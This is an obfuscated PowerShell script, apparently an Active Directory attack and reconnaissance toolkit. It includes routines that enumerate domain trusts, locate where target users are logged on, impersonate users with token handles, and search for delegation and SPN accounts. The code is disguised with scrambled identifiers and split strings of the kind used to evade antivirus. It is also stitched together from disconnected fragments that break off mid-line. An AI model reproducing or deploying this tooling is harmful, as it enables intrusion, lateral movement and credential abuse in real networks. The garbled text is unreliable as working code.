        YoV{GROIJKUPSIJKEARcHIJKEr} = &(Z3b{1}{2}{0}{3}Z3b -f S5zt-DomainSearcheS5z,S5zGS5z,S5zeS5z,S5z','AddFileS5z,S5z/S5z)
                [uint32](Z3b{0}{1}{3}{2}Z3b-fS5z0S5z,S5zx00S5z,S5z1S5z,S5z00000S5z) = (Z3b{0}{1}{3}{2}Z3b -fS5zReS5z,S5zadDatS5z,S5zyS5z,S5za/ListDirectorS5z)
            }

            YoV{SiMPlIJKEIJKpERIJKMissIJKioIJKNS} = @{
                [uint32](Z3b{0}{1}Z3b-fS5z0xS5z,S5z1f01ffS5z) = (Z3b{0}{2}{1}Z3b -fS5zFullCoS5z,S5zlS5z,S5zntroS5z)
                [uint32](Z3b{0}{1}Z3b -fS5z0x03S5z,S5z01bfS5z) = (Z3b{1}{0}Z3b -f S5zyS5z,S5zModifS5z)
                [uint32](Z3b{0}{2}{1}Z3b-f S5z0xS5z,S5z200a9S5z,S5z0S5z) = (Z3b{1}{0}{2}{3}Z3b -fS5zxeS5z,S5zReadAndES5z,S5zcS5z,S5zuteS5z)
                [uint32](Z3b{0}{2}{1}Z3b -f S5z0','V{TARGIJKeIJKTdc} = YoV{SErIJKVIJKEr}
            }
            elseif (YoV{dIJKOMIJKAIN} -and YoV{DoIJKMain}.(Z3b{0}{1}Z3b -f S5zTriS5z,S5zmS5z).Invoke() -ne S5zS5z) {
                YoV{tIJKARgeIJKTdc} = YoV{dIJKOIJKMaIn}
            }
            else {
                
                YoV{TargIJKEIJKTDc} = YoV{NIJKUlL}
            }

            
            YoV{PIJKTRiNIJKFo} =  YoV{6RIJKKIJK25P}::Z3bzIJKeRoZ3b

            
            YoV{FlIJKAgS} = 63
            YoV{DOIJKmaIJKINIJKCounT} = 0

            
            YoV{RIJKesIJKUlt} = YoV{nIJKeTIJKAPi32}::Z3bDSIJKeIJKNUmeIJKRAtedIJKomAIJKIntruStsZ3b(YoV{tarIJKGeIJKTDC}, YoV{flIJKAgS}, [ref]YoV{PtIJKRINIJKFO}, [ref]YoV{DoIJKmAiNIJKcOuNT})

            
            YoV{OFIJKFsIJKet} = YoV{PIJKTRinIJKFO}.(Z3b{0}{1}Z3b -f S5zToS5z,S5zInt64S5z).Invoke()

            
            if ((YoV{ReIJKsIJKULt} -eq 0) -and (YoV{OFIJKFIJKSet} -gt 0)) {

                
                YoV{InIJKcREMeIJKNT} = YoV{dIJKSIJK_IJKdOMaiN_TrIJKUIJKstS}::(Z3b{0}{1}Z3b-f S5zGeS5z,S5ztSizeS5z).Invoke()

                
                for (YoV{i} = 0; (YoV{I} -lt YoV{dIJKOIJKmAincIJKount}); YoV{i}++) {
                    
                    YoV{nIJKEWinTpIJKTR} = &(Z3b{2}{1}{0}Z3b-fS5zjectS5z,S5zew-ObS5z,S5zNS5z) (Z3b{3}{1}{0}{2}Z3b-fS5z.IntpS5z,S5zystemS5z,S5ztrS5z,S5zSS5z) -ArgumentList YoV{OIJKFIJKFsET}
                    YoV{INIJKFo} = YoV{nIJKEwinIJKTPIJKTr} -as YoV{Ds_doIJKmAiN_IJKTRIJKUsTs}

                    YoV{OffsIJKET} = YoV{NeWiIJKNtpIJKTr}.(Z3b{1}{0}Z3b-f S5z64S5z,S5zToIntS5z).Invoke()
                    YoV{ofIJKFSIJKet} += YoV{IIJKNcIJKRemIJKent}

                    YoV{sIdIJKSTrIJKInG} = S5zS5z
                    YoV{RIJKESIJKUlT} = YoV{ADVApIJKIIJK32}::Z3bConvEIJKRTsIIJKdIJKToSTrInGSidZ3b(YoV{InIJKFO}.Z3bdoMAIJKInSIJKIdZ3b, [ref]YoV{sIIJKdIJKStRIJKiNg});YoV{laStEIJKRIJKROr} =   (  &(Z3b{1}{0}Z3b -fS5zT-IteMS5z,S5zgeS5z)  VArIaBle:nP6Yr).Z3bValIJKUeZ3b::(Z3b{2}{0}{3}{1}Z3b-fS5ztWin32S5z,S5zrrorS5z,S5zGetLasS5z,S5zES5z).Invoke()

                    if (YoV{resIJKULt} -eq 0) {
                        &(Z3b{1}{2}{3}{0}Z3b -fS5zeS5z,S5zWrite-VS5z,S5zerboS5z,S5zsS5z) Z3b[Get-DomainTrust] Error: YoV(([ComponentModel.Win32Exception] YoVLastError).Message) Z3b
                    }
                    else {
                        YoV{domIJKAIIJKNTRIJKUsT} = &(Z3b{1}{0}{2}Z3b -fS5zObjS5z,S5zNew-S5z,S5zectS5z) (Z3b{0}{1}Z3b -fS5zPSObS5z,S5zjectS5z)
                        YoV{dOIJKMIJKAiIJKNtrUST} JGO &(Z3b{2}{0}{1}Z3b -fS5zbe','JKETIJKerS}[(Z3b{0}{2}{3}{1}Z3b-fS5zSeaS5z,S5zseS5z,S5zrchBS5z,S5zaS5z)])) {
                            
                            
                            YoV{iIJKdEnTItIJKYIJKDOmAIN} = YoV{IDenIJKTItIJKYInIJKsIJKTaNcE}.(Z3b{3}{1}{0}{2}Z3b -f S5zrinS5z,S5ztS5z,S5zgS5z,S5zSubSS5z).Invoke(YoV{idEIJKNIJKTIJKiTyINStANCE}.(Z3b{1}{0}Z3b-fS5zfS5z,S5zIndexOS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                            &(Z3b{2}{3}{1}{0}Z3b','KEteRs}[(Z3b{0}{3}{1}{2}Z3b-fS5zUseS5z,S5zdenS5z,S5ztityS5z,S5zrIS5z)] -or YoV{pSBOIJKUNDIJKPAIJKRametEIJKRs}[(Z3b{2}{0}{3}{1}Z3b-f S5zAPFS5z,S5zerS5z,S5zUserLDS5z,S5ziltS5z)] -or YoV{psIJKBoUNdPAIJKRIJKAMETERs}[(Z3b{0}{4}{3}{2}{1}Z3b -fS5zUS5z,S5zaseS5z,S5zarchBS5z,S5zSeS5z,S5zserS5z)] -or YoV{pIJKsBoUIJKNDpARAmIJKeteIJKRS}[(Z3b{0}{1}{4}{2}{3}Z3b -fS5zUserS5z,S5zAdS5z,S5zCouS5z,S5zntS5z,S5zminS5z)] -or YoV{psIJKBouIJKNIJKdparAmETIJKERs}[(Z3b{1}{3}{0}{5}{2}{4}Z3b -f S5zllowDeleS5z,S5zUsS5z,S5ztioS5z,S5zerAS5z,S5znS5z,S5zgaS5z)]) {
            YoV{tIJKAIJKRIJKGeTusErs} = &(Z3b{2}{0}{1}{3}Z3b -fS5z-S5z,S5zDomS5z,S5zGetS5z,S5zainUserS5z) @UserSearcherArguments JGO &(Z3b{1}{0}{2}{3}Z3b-f S5zlectS5z,S5zSeS5z,S5z-ObjeS5z,S5zctS5z) -ExpandProperty (Z3b{3}{0}{2}{1}Z3b -fS5zmaccS5z,S5zeS5z,S5zountnamS5z,S5zsaS5z)
        }
        else {
            YoV{GIJKRoupSeIJKArIJKCHIJKerAIJKRguIJKMENtS} = @{
                (Z3b{2}{0}{1}Z3b -fS5zenS5z,S5ztityS5z,S5zIdS5z) = YoV{uIJKsErgrIJKoUpIdENtiIJKTy}
                (Z3b{0}{2}{1}Z3b -f S5zRecuS5z,S5zeS5z,S5zrsS5z) = YoV{tRIJKUE}
            }
            if (YoV{pSBIJKOUIJKNdpaRaMEIJKTeRS}[(Z3b{2}{1}{0}Z3b-fS5zinS5z,S5zerDomaS5z,S5zUsS5z)]) { YoV{GRIJKOuPIJKSIJKEARCHIJKeIJKRaRGUMeNIJKTs}[(Z3b{1}{0}Z3b -f S5zinS5z,S5zDomaS5z)] = YoV{USeIJKRdIJKoMAiN} }
            if (YoV{pIJKSBOuNdPaIJKRameIJKTIJKERS}[(Z3b{2}{4}{1}{0}{3}Z3b -f S5zsS5z,S5zchBaS5z,S5zUserSeaS5z,S5zeS5z,S5zrS5z)]) { YoV{grIJKOuIJKPsEarCHEIJKRaIJKRIJKgIJKUMeNTS}[(Z3b{2}{0}{1}Z3b-f S5zchBaS5z,S5zseS5z,S5zSearS5z)] = YoV{UsErsIJKEaIJKRChIJKBASE} }
            if (YoV{PIJKSBOUnIJKdPIJKARaIJKmIJKETERs}[(Z3b{1}{0}Z3b-f S5zerS5z,S5zServS5z)]) { YoV{gRIJKOUpSEIJKARCIJKHEraRguMeNIJKTS}[(Z3b{0}{1}Z3b -f S5zServS5z,S5zerS5z)] = YoV{SEIJKRvER} }
            if (YoV{PsbIJKOuIJKNDIJKPaIJKRAmEtIJKers}[(Z3b{3}{2}{1}{0}Z3b -fS5zcopeS5z,S5zhSS5z,S5zcS5z,S5zSearS5z)]) { YoV{GroIJKUIJKPSEaIJKRIJKcHeRaRGuMENIJKTs}[(Z3b{2}{1}{3}{0}Z3b -f S5zeS5z,S5zearchScS5z,S5zSS5z,S5zopS5z)] = YoV{sEIJKArCHIJKscoIJKpE} }
            if (YoV{psboUNdIJKpIJKAIJKRIJKAIJKMeTErs}[(Z3b{2}{3}{0}{1}Z3b -fS5zageS5z,S5zSizeS5z,S5zReS5z,S5zsultPS5z)]) { YoV{GROUpSEIJKAIJKRcHeIJKRArGIJKUmEIJKNTS}[(Z3b{2}{3}{4}{1}{0}Z3b -fS5zeS5z,S5zzS5z,S5zResuS5z,S5zltPageS5z,S5zSiS5z)] = YoV{ResUIJKLTPaGeSiIJKZE} }
            if (YoV{PsBIJKoUndIJKPAIJKRAIJKMEteRS}[(Z3b{1}{0}{3}{2}Z3b -f S5zvS5z,S5zSerS5z,S5ztS5z,S5zerTimeLimiS5z)]) { YoV{gIJKRoUIJKPSeArcHErIJKArgUMIJKEIJKNTs}[(Z3b{3}{2}{1}{0}{4}Z3b -f S5zLimS5z,S5zmeS5z,S5zerTiS5z,S5zServS5z,S5zitS5z)] = YoV{SERvIJKeIJKRtiMElimIt} }
            if (YoV{PsbouIJKNDpAraIJKMeIJKTErS}[(Z3b{0}{2}{1}Z3b -f S5zTombS5z,S5zoneS5z,S5zstS5z)]) { YoV{GRoUPsEIJKArCIJKhIJKeRaIJKRguIJKmEIJKNTS}[(Z3b{2}{0}{1}Z3b -fS5zombsS5z,S5ztoneS5z,S5zTS5z)] = YoV{TIJKomIJKBsTIJKoNe} }
            if (YoV{PSbounDIJKpaRaMIJKEIJKTERs}[(Z3b{0}{1}{2}Z3b -fS5zCredS5z,S5zentiaS5z,S5zlS5z)]) { YoV{GroIJKUPIJKSEIJKARchErAIJKRIJKgUmIJKenTS}[(Z3b{0}{2}{1}Z3b-fS5zCreS5z,S5zalS5z,S5zdentiS5z)] = YoV{CrIJKeDENTIJKiAl} }
            YoV{TIJKARgIJKetUSIJKErs} = &(Z3b{5}{3}{4}{2}{1}{6}{0}Z3b-fS5zerS5z,S5znGrouS5z,S5zmaiS5z,S5zetS5z,S5z-DoS5z,S5zGS5z,S5zpMembS5z) @GroupSearcherArguments JGO &(Z3b{0}{2}{1}Z3b-f S5zSelect-OS5z,S5ztS5z,S5zbjecS5z) -ExpandProperty (Z3b{0}{1}{2}Z3b -fS5zMembS5z,S5zerNS5z,S5zameS5z)
        }

        &(Z3b{1}{3}{2}{0}Z3b -fS5zeS5z,S5zWrite-VS5z,S5zsS5z,S5zerboS5z) Z3b[Find-DomainUserLocation] TargetUsers length: YoV(YoVTargetUsers.Length) Z3b
        if ((-not YoV{sIJKHowAIJKLL}) -and (YoV{TIJKARGIJKetUSERs}.Z3blIJKeIJKNGtHZ3b -eq 0)) {
            throw (Z3b{2}{5}{7}{3}{1}{6}{4}{0}{8}Z3b-fS5zund to taS5z,S5zLoS5z,S5z[Find-DS5z,S5zerS5z,S5zs foS5z,S5zomS5z,S5zcation] No userS5z,S5zainUsS5z,S5zrgetS5z)
        }

        
        YoV{HIJKoSIJKTENIJKUmbLoCK} = {
            Param(YoV{cOmPUteIJKRIJKNaME}, YoV{TIJKARgetUIJKsIJKers}, YoV{CIJKUIJKRIJKReNtUSER}, YoV{sIJKTeaLIJKTH}, YoV{TOkeNHaIJKNDIJKLe})

            if (YoV{tIJKOIJKkeNhANDlE}) {
                
                YoV{NIJKUlL} = &(Z3b{6}{3}{5}{2}{1}{4}{0}Z3b-fS5znationS5z,S5zsS5z,S5zmperS5z,S5zoS5z,S5zoS5z,S5zke-UserIS5z,S5zInvS5z) -TokenHandle YoV{tOIJKKEIJKNhanIJKDlE} -Quiet
            }

            ForEach (YoV{tIJKARgetCOIJKMputIJKEr} in YoV{compUIJKTERNIJKAMe}) {
                YoV{uIJKp} = &(Z3b{1}{3}{0}{4}{2}Z3b-fS5z-ConnS5z,S5zTeS5z,S5znS5z,S5zstS5z,S5zectioS5z) -Count 1 -Quiet -ComputerName YoV{TIJKArgIJKETcoIJKMPIJKUTer}
                if (YoV{up}) {
                    YoV{sEIJKSSionS} = &(Z3b{3}{0}{1}{2}Z3b -fS5z-NetS5z,S5zSeS5z,S5zssionS5z,S5zGetS5z) -ComputerName YoV{TIJKARIJKgeTcomPIJKUteR}
                    ForEach (YoV{sIJKeSsiON} in YoV{sEsSIJKIoIJKNS}) {
                        YoV{uIJKSeIJKRNAme} = YoV{SEssIJKioN}.Z3busIJKErIJKNAmeZ3b
                        YoV{CnaIJKme} = YoV{seIJKSsIJKiON}.Z3bcIJKNamEZ3b

                        if (YoV{cNIJKAMe} -and YoV{cnIJKAIJKmE}.(Z3b{0}{2}{1}Z3b -fS5zSS5z,S5zhS5z,S5ztartsWitS5z).Invoke(S5z5rj5rjS5z)) {
                            YoV{cIJKNaMe} = YoV{CIJKNaMe}.(Z3b{0}{1}Z3b-f S5zTrimStS5z,S5zartS5z).Invoke(S5z5rjS5z)
                        }

                        
                        if ((YoV','eLiNEBYPrOPeRtYnAMe = YoV{tIJKRUE})]
        [Alias({Z3b{1}{0}Z3b-f S5zeS5z,S5zNamS5z}, {Z3b{1}{0}{2}Z3b -fS5zdeS5z,S5zIS5z,S5zntityS5z})]
        [String[]]
        YoV{OBjEIJKCIJKTNaIJKME},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DIJKOMAIJKiN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{3}{0}{1}Z3b -f S5zontrS5z,S5zollerS5z,S5zDomainS5z,S5zCS5z})]
        [String]
        YoV{SERIJKVIJKER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CReIJKDeIJKNTiAl} =  (&(Z3b{2}{0}{1}Z3b-f S5zChiLDIS5z,S5zTeMS5z,S5zGet-S5z) VAriaBLE:jfi).Z3bVAIJKLUEZ3b::Z3beMPIJKTYZ3b
    )

    BEGIN {
        YoV{doMAIJKiNSeaRIJKcherIJKARIJKGumeNTS} = @{}
        if (YoV{pIJKsbOUnDPAramIJKeTeIJKRS}[(Z3b{0}{1}Z3b -f S5zDoS5z','JKBNetIJKSeARIJKCIJKHER}) {
            YoV{iIJKDEntiIJKTIJKyFiLTIJKer} = S5zS5z
            YoV{FIIJKlTeR} = S5zS5z
            YoV{iDENtIJKIIJKTY} JGO &(Z3b{3}{1}{2}{0}Z3b -fS5zbjectS5z,S5zhS5z,S5zere-OS5z,S5zWS5z) {YoV{_}} JGO &(Z3b{0}{1}{3}{2}Z3b -fS5zFoS5z,S5zrEach-ObjS5z,S5zctS5z,S5zeS5z) {
                YoV{iDEnTiTIJKyIJKinSTIJKAIJKNCe} = YoV{_}.(Z3b{0}{1}{2}Z3b-fS5zReplS5z,S5zaS5z,S5zceS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{1}{0}Z3b-f S5zeS5z,S5zReplacS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                if (YoV{IdeNtIJKITIJKyIJKInsTAIJKNCe} -match (Z3b{0}{1}Z3b-f S5z^S5z,S5zCN=.*S5z)) {
                    YoV{ideNTiIJKTIJKYIJKFIlIJKTer} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                    if ((-not YoV{pSBOuIJKNDPArAMIJKeTIJKEIJKRs}[(Z3b{1}{0}Z3b-fS5znS5z,S5zDomaiS5z)]) -and (-not YoV{psbOIJKUnIJKDIJKPARaMIJKEIJKTErS}[(Z3b{1}{0}{2}Z3b','       if (YoV{TrIJKUIJKsTS} -isnot [System.Array]) {
                        YoV{TIJKRIJKUSts} = @(YoV{TRUIJKStS})
                    }

                    
                    ForEach (YoV{tRIJKUsT} in YoV{TIJKRUsTs}) {
                        if (YoV{TrUIJKst}.Z3bsOuRCIJKEIJKNAMEZ3b -and YoV{tIJKRUST}.Z3bTIJKARgEtNIJKAMeZ3b) {
                         ','UmenTS}[S5zRawS5z] = YoV{TrIJKUE}

                &(Z3b{4}{0}{3}{1}{2}Z3b-fS5zeS5z,S5zcS5z,S5ztS5z,S5zt-DomainObjeS5z,S5zGS5z) @SearcherArguments JGO &(Z3b{0}{2}{1}{3}Z3b-f S5zForEach-S5z,S5zbjecS5z,S5zOS5z,S5ztS5z) {
                    
                    YoV{oIJKBJectdiIJKRIJKEcIJKTORyIJKenTRy} = YoV{_}.(Z3b{1}{4}{2}{0}{3}{5}Z3b -f S5zoryES5z,S5zGeS5z,S5zrectS5z,S5zntS5z,S5ztDiS5z,S5zryS5z).Invoke()

                    
                    YoV{objectIJKdIIJKReCTOrYeNIJKTIJKRy}.(Z3b{2}{0}{1}Z3b -fS5zrS5z,S5zeshCacheS5z,S5zRefS5z).Invoke((Z3b{0}{1}{2}Z3b-fS5ztokenGS5z,S5zroupS5z,S5zsS5z))

                    YoV{oIJKBIJKJEIJKctdIrEcTOIJKRyeIJKNTry}.Z3bTIJKoIJKkeNGRoUpsZ3b JGO &(Z3b{4','  if (YoV{pIJKsBoUNdpARAIJKmeTIJKeRs}[(Z3b{0}{1}{2}Z3b -fS5zUseS5z,S5zrIdeS5z,S5zntityS5z)]) { YoV{uIJKseIJKRSeaRIJKCherIJKAIJKRGIJKUmENtS}[(Z3b{1}{2}{0}Z3b-fS5ztyS5z,S5zIdS5z,S5zentiS5z)] = YoV{USeRiDeNIJKTIJKITy} }
        if (YoV{PsbIJKoUNdIJKpAIJKRIJKAmeTeRs}[(Z3b{2}{1}{0}Z3b-fS5zmainS5z,S5zerDoS5z,S5zUsS5z)]) { YoV{UsIJKeIJKRsearcHIJKERArgUMEIJKNtS}[(Z3b{0}{2}{1}Z3b-f S5zDomS5z,S5zinS5z,S5zaS5z','5ztS5z,S5z-NetForS5z,S5zinS5z,S5zGeS5z) (Z3b{2}{1}{0}Z3b-fS5zainS5z,S5zmS5z,S5zGet-ForestDoS5z)
&(Z3b{0}{2}{1}Z3b-fS5zSS5z,S5z-AliasS5z,S5zetS5z) (Z3b{4}{1}{5}{0}{3}{2}Z3b -fS5zaS5z,S5zt-NetFS5z','5z,S5zneLevS5z}, {Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zreS5z,S5zSubtS5z})]
        [String]
        YoV{SIJKearcIJKhIJKScOPe} = (Z3b{1}{0}Z3b-fS5zbtreeS5z,S5zSuS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{RIJKesulIJKTpagEsIIJKZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SeRveRIJKTIIJKMELIMIJKit},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zDacS5z,S5zlS5z}, {Z3b{1}{0}Z3b-f S5zoupS5z,S5zGrS5z}, {Z3b{0}{1}Z3b-f S5zNoS5z,S5zneS5z}, {Z3b{1}{0}Z3b-fS5zerS5z,S5zOwnS5z}, {Z3b{0}{1}Z3b -f S5zSS5z,S5zaclS5z})]
        [String]
        YoV{SeIJKcUrItYmaSIJKkS},

        [Switch]
        YoV{TIJKOMIJKBSTonE},

        [Alias({Z3b{2}{0}{1}Z3b-f S5zurnS5z,S5zOneS5z,S5zRetS5z})]
        [Switch]
        YoV{fIJKIndOIJKNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKREDENTIJKIAL} =   (  &(Z3b{1}{0}Z3b -fS5zIS5z,S5zgCS5z)  (Z3bvaRIabLZ3b+Z3be:Z3b+Z3bJFZ3b+Z3bIZ3b)  ).Z3bvaIJKLueZ3b::Z3bEmPIJKTyZ3b','ION = 3, mAndATORy=YoV{tIJKRUe})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        YoV{EnuIJKMIJKEIJKlEMeNTS},

        [Switch]
        YoV{BIJKIIJKTFIELd}
    )

    if (YoV{mIJKODUle} -is [Reflection.Assembly])
    {
        return (YoV{mOdIJKULe}.(Z3b{0}{1}Z3b-fS5zGS5z,S5zetTypeS5z).Invoke(YoV{fULlIJKNIJKAMe}))
    }

    YoV{enIJKUIJKmtYpe} = YoV{TYIJKpE} -as [Type]

    YoV{EIJKNUMIJKBuIJKILder} = YoV{MIJKOdUIJKlE}.(Z3b{1}{0}{2}Z3b-f S5zfineEnuS5z,S5zDeS5z,S5zmS5z).Invoke(YoV{fuLlIJKNIJKAIJKmE}, (Z3b{1}{0}Z3b-fS5zublicS5z,S5zPS5z), YoV{EnIJKUMtYpe})

    if (YoV{BIJKIIJKTfiELd})
    {
        YoV{FlaGScIJKonsTIJKRuIJKcIJKTor} =  (  &(Z3b{2}{0}{1}Z3b -f S5zAS5z,S5zBlES5z,S5zvariS5z) awF -VA ).Z3bgeTCoNSIJKTRuCTIJKorZ3b(@())
        YoV{flAgscuIJKstIJKoMAttrIIJKBIJKUIJKTe} = &(Z3b{1}{2}{0}{3}Z3b -fS5zObjecS5z,S5zNewS5z,S5z-S5z,S5ztS5z) (Z3b{0}{5}{4}{6}{8}{9}{2}{1}{3}{7}Z3b -fS5zReflS5z,S5zuS5z,S5zributeBS5z,S5ziS5z,S5zctionS5z,S5zeS5z,S5z.EmiS5z,S5zlderS5z,S5zt.CustomAtS5z,S5ztS5z)(YoV{FlIJKAIJKgsIJKCoIJKNsTRUCtIJKor}, @())
        YoV{EIJKNUmIJKBuilDIJKEr}.(Z3b{3}{1}{0}{4}{2}Z3b -f S5zomAS5z,S5ztCustS5z,S5zibuteS5z,S5zSeS5z,S5zttrS5z).Invoke(YoV{fIJKlagIJKsCUstoIJKmAIJKTTRIbUtE})
    }

    foreach (YoV{kIJKEY} in YoV{eIJKNUMELEmenIJKTS}.Z3bkEIJKYSZ3b)
    {
        
        YoV{nIJKUlL} = YoV{eIJKNUIJKmBUIlDIJKEr}.Z3bDIJKefiIJKNELIIJKTeRALZ3b(YoV{KIJKEy}, YoV{ENIJKUMIJKelemENTS}[YoV{KIJKeY}] -as YoV{EIJKNIJKUMTYpe})
    }

    YoV{eNuIJKMbuilIJKDEr}.(Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zteTypS5z,S5zCreaS5z).Invoke()
}




function fIEIJKLd {
    Param (
        [Parameter(pOsITioN = 0, mAndAtoRy=YoV{TIJKRUE})]
        [UInt16]
        YoV{pIJKoSitIJKion},

        [Parameter(pOsiTIoN = 1, maNDaTOry=YoV{trIJKUE})]
        [Type]
        YoV{TYIJKpE},

        [Parameter(pOSiTIoN = 2)]
        [UInt16]
        YoV{oFfIJKSIJKEt},

        [Object[]]
        YoV{MIJKARSHaIJKlAS}
    )

    @{
        POSItIon = YoV{PoSIJKItIIJKon}
        (Z3b{0}{1}Z3b-fS5zTS5z,S5zypeS5z) = YoV{tYIJKPE} -as [Type]
        (Z3b{1}{0}Z3b-f S5zsetS5z,S5zOffS5z) = YoV{ofIJKFset}
        (Z3b{0}{2}{1}Z3b-fS5zMarS5z,S5zalAsS5z,S5zshS5z) = YoV{MARsIJKhAIJKLaS}
    }
}


function sTrUIJKCT
{


    [OutputType([Type])]
    Param (
        [Parameter(pOSition = 1, MANDatoRy=YoV{TIJKRue})]
        [ValidateScript({(YoV{_} -is [Reflection.Emit.ModuleBuilder]) -or (YoV{_} -is [Reflection.Assembly])})]
        YoV{moDIJKUIJKlE},

        [Parameter(pOsitION = 2, mAndatORY=YoV{trIJKUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{fUlLNIJKAIJKMe},

        [Parameter(POSitioN = 3, MAnDaTORy=YoV{tRIJKUe})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        YoV{SIJKTIJKRuCTFIeIJKlIJKdS},

        [Reflection.Emit.PackingSize]
        YoV{pIJKAIJKCKIngsiIJKze} =   YoV{6R9IJKVIJK28}::Z3bUnSIJKPEcifiIJKEdZ3b,

        [Switch]
        YoV{EIJKxIJKpLIIJKcIIJKTlaYOuT}
    )

    if (YoV{mIJKODule} -is [Reflection.Assembly])
    {
        return (YoV{MOIJKdULe}.(Z3b{1}{0}{2}Z3b -fS5zTypS5z,S5zGetS5z,S5zeS5z).Invoke(YoV{FULLNIJKAIJKMe}))
    }

    [Reflection.TypeAttributes] YoV{sTruCtI','TSFrS5z,S5zMemoryES5z,S5zxS5z).Invoke(2, YoV{PPsessioIJKNIJKiNIJKFO}, YoV{pCIJKOuNt})
                }
                else {
                    &(Z3b{3}{1}{2}{0','5zIR_RS5z,S5zQUS5z,S5zES5z)                =   8
    (Z3b{2}{0}{1}Z3b -f S5zCKOUS5z,S5zTS5z,S5zLOS5z)                         =   16
    (Z3b{2}{3}{1}{0}Z3b -fS5zREQDS5z,S5zOTS5z,S5zPASSS5z,S5zWD_NS5z)                  =   32
    (Z3b{4}{2}{1}{3}{0}Z3b -fS5zES5z,S5zHANS5z,S5zNT_CS5z,S5zGS5z,S5zPASSWD_CAS5z)              =   64
    (Z3b{5}{0}{1}{2}{6}{3}{7}{4}Z3b -fS5zCS5z,S5zRYPTS5z,S5zEDS5z,S5zEXT_PWD_S5z,S5zWEDS5z,S5zENS5z,S5z_TS5z,S5zALLOS5z)      =   128
    (Z3b{4}{2}{1}{3}{0}Z3b-f S5zUNTS5z,S5zTES5z,S5z_DUPLICAS5z,S5z_ACCOS5z,S5zTEMPS5z)          =   256
    (Z3b{1}{4}{2}{3}{0}Z3b-f S5zTS5z,S5zNORS5z,S5zCCOUS5z,S5zNS5z,S5zMAL_AS5z)                  =   512
    (Z3b{3}{2}{0}{1}{4}Z3b -fS5zAIN_TRUST_AS5z,S5zCCOUS5z,S5zDOMS5z,S5zINTERS5z,S5zNTS5z)       =   2048
    (Z3b{3}{6}{0}{4}{7}{2}{1}{5}Z3b-f S5zATION_S5z,S5zT_ACS5z,S5zSS5z,S5zWORKS5z,S5zTRS5z,S5zCOUNTS5z,S5zSTS5z,S5zUS5z)       =   4096
    (Z3b{1}{2}{4}{5}{0}{3}Z3b -f S5zOUS5z,S5zSERS5z,S5zVES5z,S5zNTS5z,S5zR_TS5z,S5zRUST_ACCS5z)            =   8192
    (Z3','lS5z,S5zUserS5z,S5zerS5z)]) { YoV{UseRIJKSEARIJKCHERaRgIJKUIJKmEntS}[(Z3b{0}{1}{2}Z3b-f S5zLDS5z,S5zAPFiltS5z,S5zerS5z)] = YoV{uIJKsEIJKRLdaPfIJKilIJKTeR} }
        if (YoV{pIJKSBoIJKUnDPaRAMeteIJKRS}[(Z3b{0}{2}{1}{4}{3}Z3b -fS5zUserS5z,S5zeS5z,S5zSS5z,S5zseS5z,S5zarchBaS5z)]) { YoV{UseIJKRSEAIJKRcherARGIJKUIJKMeNtS}[(Z3b{3}{0}{2}{1}Z3b -f S5zrcS5z,S5zseS5z,S5zhBaS5z,S5zSeaS5z)] = YoV{uSerIJKSeAIJKRIJKChBAIJKsE} }
        if (YoV{PsIJKBIJKoIJKUndpaRAmEteRS}[(Z3b{1}{2}{0}{3}Z3b -fS5znCouS5z,S5zUsS5z,S5zerAdmiS5z,S5zntS5z)]) { YoV{UsERIJKSEARChIJKERaRgUIJKMIJKeNTS}[(Z3b{2}{0}{1}Z3b-f S5zdS5z,S5zminCountS5z,S5zAS5z)] = YoV{uIJKSERAIJKDmiIJKNCOunT} }
        if (YoV{psbOIJKUNIJKDpaIJKRAMEIJKTIJKERS}[(Z3b{1}{0}{4}{2}{3}{5}Z3b -f S5zlowDelS5z,S5zUserAlS5z,S5zgS5z,S5zatioS5z,S5zeS5z,S5znS5z)]) { YoV{uSErSIJKEaIJKRcHEIJKRIJKArGUmentS}[(Z3b{1}{3}{0}{4}{2}Z3','b -f S5zhiS5z,S5zuteS5z,S5zomS5z,S5ztS5z,S5zthat S5z,S5zprincipaS5z,S5zsted to aS5z,S5zenS5z,S5zarcS5z,S5zare truS5z,S5zrs S5z,S5zpuS5z,S5zngS5z,S5zfS5z,S5z S5z,S5zter]S5z,S5z SeS5z,S5z-DomainCS5z,S5z[GetS5z,S5zicate forS5z,S5zor compS5z,S5zuthS5z,S5zherS5z,S5z otS5z,S5zlsS5z,S5z S5z)
                YoV{fiLIJKTer} += (Z3b{0}{1}{5}{6}{8}{2}{3}{4}{7}Z3b -f S5z(S5z,S5zmsdS5z,S5zleS5z,S5zgatetoS5z,S5z=*S5z,S5zs-alloweS5z,S5zdS5z,S5z)S5z,S5ztodeS5z)
            }
            if (YoV{PsBIJKOUIJKNdPIJKAIJKRAmIJKeTers}[(Z3b{0}{2}{1}Z3b -fS5zPrinteS5z,S5zsS5z,S5zrS5z)]) {
                &(Z3b{2}{3}{4}{1}{0}Z3b-f S5zeS5z,S5zosS5z,S5zWriS5z,S5zte-VeS5z,S5zrbS5z) (Z3b{5}{8}{3}{4}{1}{0}{6}{9}{7}{2}Z3b -fS5zSeaS5z,S5zr] S5z,S5zntersS5z,S5zDomaS5z,S5zinComputeS5z,S5z[GeS5z,S5zrcS5z,S5ziS5z,S5zt-S5z,S5zhing for prS5z)
                YoV{FIJKilTeR} += ((Z3b{3}{2}{4}{5}{0}{1}Z3b -f S5z=printQueuS5z,S5ze)S5z,S5zoS5z,S5z(S5z,S5zbjectCaS5z,S5ztegoryS5z))
            }
            if (YoV{pSBouNIJKdIJKpAraMIJKeteRs}[S5zSPNS5z]) {
